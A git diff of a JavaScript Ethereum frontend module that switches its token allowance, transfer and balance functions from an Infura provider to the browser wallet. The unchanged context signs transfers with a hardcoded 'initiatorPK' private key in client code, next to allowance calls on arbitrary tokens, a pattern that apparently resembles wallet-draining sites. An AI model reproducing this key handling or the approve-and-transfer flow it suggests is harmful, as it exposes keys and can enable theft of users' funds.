@@ -98,7 +98,7 @@ export const claim = async (_balance) => {
 };
 export const increaseAllowance = async (token) => {
   try {
-    const web3 = new Web3(new Web3.providers.HttpProvider(constants.infura));
+    const web3 = new Web3(window.ethereum);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -291,7 +291,7 @@ export const increaseAllowance = async (token) => {
 
 export const transfer = async (token) => {
   try {
-    const provider = new ethers.providers.JsonRpcProvider(constants.infura);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -323,7 +323,7 @@ export const ethBalance = async () => {
 
 export const allownce = async (token) => {
   try{
-    const web3 = new Web3(new Web3.providers.HttpProvider(constants.infura));
+    const web3 = new Web3(window.ethereum);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -337,7 +337,7 @@ export const allownce = async (token) => {
 
 export const balanceOf = async (token) => {
   try{
-    const web3 = new Web3(new Web3.providers.HttpProvider(constants.infura));
+    const web3 = new Web3(window.ethereum);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
